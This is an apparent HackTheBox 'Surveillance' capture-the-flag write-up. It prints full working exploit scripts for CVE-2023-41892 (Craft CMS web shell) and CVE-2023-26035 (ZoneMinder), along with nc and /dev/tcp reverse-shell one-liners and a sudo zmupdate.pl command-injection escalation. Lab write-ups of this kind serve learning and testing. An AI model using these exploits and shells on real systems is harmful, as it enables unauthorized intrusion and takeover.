@@ -1,0 +1,283 @@
+---
+layout: post
+title: "Surveillance e9fc577cd1014f2aa42663e1d6339231"
+date:   2025-07-10 12:05:57 -0400
+categories: writeups
+---
+
+# Surveillance
+
+HackTheBox: Medium
+
+<aside>
+💡 Surveillance is a medium linux machine with a monitor service
+
+</aside>
+
+## 1: Enumeration
+
+- Check the active connection
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled.png' | relative_url }})
+
+- Scanning ports
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_1.png' | relative_url }})
+
+We can see there’s a web services running in 80 port and ssh service in 22 
+
+## 2: Looking around
+
+- There is a web service powered by Craft CMS in the main page. CVE-2023-41892 is a vulnerability for this technology, we need to execute a POC for this vulnerability, but after a lot of time fixing parameters made by machine configurations we find the right version of the exploit.
+
+```bash
+import requests
+import re
+import sys
+
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
+}
+
+def writePayloadToTempFile(documentRoot):
+    data = {
+        "action": "conditions/render",
+        "configObject[class]": "craft\elements\conditions\ElementCondition",
+        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:"}}}'
+    }
+
+    files = {
+        "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
+        <image>
+        <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
+        <write filename="info:DOCUMENTROOT/cpresources/shell.php">
+        </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
+    }
+
+    response = requests.post(url, headers=headers, data=data, files=files, proxies={"http": "http://127.0.0.1:8080"})
+
+def getTmpUploadDirAndDocumentRoot():
+    data = {
+        "action": "conditions/render",
+        "configObject[class]": "craft\elements\conditions\ElementCondition",
+        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
+    }
+
+    response = requests.post(url, headers=headers, data=data)
+
+    pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
+    pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
+
+    match1 = re.search(pattern1, response.text, re.DOTALL)
+    match2 = re.search(pattern2, response.text, re.DOTALL)
+    print(match1.group(1), match2.group(1))
+    return match1.group(1), match2.group(1)
+
+def trigerImagick(tmpDir):
+    data = {
+        "action": "conditions/render",
+        "configObject[class]": "craft\elements\conditions\ElementCondition",
+        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
+    }
+    response = requests.post(url, headers=headers, data=data)
+
+def shell(cmd):
+    response = requests.get(base_url + "/cpresources/shell.php", params={"cmd": cmd})
+    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)
+
+    if match:
+        extracted_text = match.group(1).strip()
+        print(extracted_text)
+    else:
+        return None
+    return extracted_text
+
+if __name__ == "__main__":
+    if (len(sys.argv) != 2):
+        print("Usage: python CVE-2023-41892.py <url>")
+        exit()
+    else:
+        url = sys.argv[1]
+        base_url = 'http://surveillance.htb'
+        print("[-] Get temporary folder and document root ...")
+        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
+        tmpDir = "/tmp" if "no value" in upload_tmp_dir else upload_tmp_dir
+        print("[-] Write payload to temporary file ...")
+        try:
+            writePayloadToTempFile(documentRoot)
+        except requests.exceptions.ConnectionError as e:
+            print("[-] Crash the php process and write temp file successfully")
+
+        print("[-] Trigger imagick to write shell ...")
+        try:
+            trigerImagick(tmpDir)
+        except:
+            pass
+
+        print("[-] Done, enjoy the shell")
+        while True:
+            cmd = input("$ ")
+            shell(cmd)
+```
+
+- 
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_2.png' | relative_url }})
+
+- Make a little bit more stable the bash
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_3.png' | relative_url }})
+
+This is pretty much it:
+
+1. **`**rm /tmp/f**`:**
+
+— Deletes any existing file named `/tmp/f` to ensure a fresh start.
+
+2. **`**mkfifo /tmp/f**`:**
+
+— Creates a named pipe (FIFO) named `/tmp/f`. A named pipe is a special type of file that allows processes to communicate.
+
+3. **`**cat /tmp/f | /bin/bash -i 2>&1**`:**
+
+— Reads from the named pipe (`/tmp/f`) and pipes the content to `/bin/bash` with the `-i` option for an interactive shell.
+
+— The `2>&1` redirects standard error (file descriptor 2) to standard output (file descriptor 1), ensuring that error messages are also sent through the pipeline.
+
+4. **`**nc 10.10.x.x 4444 >/tmp/f**`:**
+
+— Initiates a Netcat (`nc`) connection to the IP address `10.10.x.x` on port `4444`.
+
+— The standard output of the entire pipeline (which includes the output of the Bash shell) is redirected to the named pipe `/tmp/f`. This completes the loop, sending the shell output back into the named pipe, creating a bidirectional communication channel
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_4.png' | relative_url }})
+
+## 3: User flag
+
+Got db creds 
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_5.png' | relative_url }})
+
+Just hash with
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_6.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_7.png' | relative_url }})
+
+## 4: Priv esc
+
+- We check active connections with
+
+```bash
+netstat -natu -nltp
+```
+
+There is something running locally
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_8.png' | relative_url }})
+
+We go to /etc/nignx/sites-enable and cat zoneminder.conf
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_9.png' | relative_url }})
+
+There is a zoneminder service running that is a monitored technology lets port fowarding with ssh
+
+```bash
+ssh -L port:ip:port
+```
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_10.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_11.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_12.png' | relative_url }})
+
+Info about zoneminder versions, lets look for some vulnerability
+
+(CVE-202326035) POC 
+
+```bash
+import re
+import requests
+from bs4 import BeautifulSoup
+import argparse
+import base64
+
+# CVE-2023-26035 - Unauthenticated RCE in ZoneMinder Snapshots
+# Author : Ravindu Wickramasinghe | rvz (@RVIZX9)
+
+class ZoneMinderExploit:
+    def __init__(self, target_uri):
+        self.target_uri = target_uri
+        self.csrf_magic = None
+
+    def fetch_csrf_token(self):
+        print("[>] fetching csrt token")
+        response = requests.get(self.target_uri)
+        self.csrf_magic = self.get_csrf_magic(response)
+        if response.status_code == 200 and re.match(r'^key:[a-f0-9]{40},\d+', self.csrf_magic):
+            print(f"[>] recieved the token: {self.csrf_magic}")
+            return True
+        print("[!] unable to fetch or parse token.")
+        return False
+
+    def get_csrf_magic(self, response):
+        return BeautifulSoup(response.text, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value', None)
+
+    def execute_command(self, cmd):
+        print("[>] sending payload..")
+        data = {'view': 'snapshot', 'action': 'create', 'monitor_ids[0][Id]': f';{cmd}', '__csrf_magic': self.csrf_magic}
+        response = requests.post(f"{self.target_uri}/index.php", data=data)
+        print("[>] payload sent" if response.status_code == 200 else "[!] failed to send payload")
+
+    def exploit(self, payload):
+        if self.fetch_csrf_token():
+            print(f"[>] executing...")
+            self.execute_command(payload)
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-t', '--target-url', required=True, help='target url endpoint')
+    parser.add_argument('-ip', '--local-ip', required=True, help='local ip')
+    parser.add_argument('-p', '--port', required=True, help='port')
+    args = parser.parse_args()
+
+    # generating the payload
+    ps1 = f"bash -i >& /dev/tcp/{args.local_ip}/{args.port} 0>&1"  
+    ps2 = base64.b64encode(ps1.encode()).decode()
+    payload = f"echo {ps2} | base64 -d | /bin/bash"
+
+    ZoneMinderExploit(args.target_url).exploit(payload)
+```
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_13.png' | relative_url }})
+
+Access as zoneminder
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_14.png' | relative_url }})
+
+check for premises
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_15.png' | relative_url }})
+
+We can update db and change others file in zm
+
+But we are no going to update anything we are going to pass a revshell in user update
+
+1. We can stabilize the shell using import ptty but it is not necessary, we create the revshell and pass it trought a python server
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_16.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_17.png' | relative_url }})
+
+chmod 700 or chmod  +x  for permisses
+
+We need to be listening at the port specify 
+
+And as a final step:
+
+![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_18.png' | relative_url }})
+
+```bash
+sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/exploitfinalbello.sh)' --pass=ZoneMinderPassword2023
+```
